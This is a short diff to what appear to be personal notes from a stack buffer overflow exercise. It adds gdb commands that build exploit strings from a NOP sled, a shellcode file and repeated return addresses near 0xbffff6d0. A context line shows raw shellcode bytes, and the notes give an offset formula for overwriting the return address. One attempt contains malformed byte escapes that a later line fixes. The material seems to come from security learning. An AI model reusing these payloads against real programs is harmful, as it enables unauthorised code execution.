@@ -49,6 +49,14 @@ run Mr $(python -c 'print "\x90" * 381 + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x
 To overflow the buffer 
  [buffersize] + 8 + 6 in bytes
  
- wc -c sc
+wc -c sc
  
- 
+0xbffff6d0
+
+run Mr `perl -e 'print "\x90" x 276'``cat sc``perl -e 'print "A" x 16'`
+
+run Mr `perl -e 'print "\x90" x 276'``cat sc``perl -e 'print "\xd0\f6\ff\bf" x 4'`
+
+run Mr `perl -e 'print "\x90" x 267'``cat sc``perl -e 'print "\xd0\xf6\xff\xbf" x 6'`
+
+
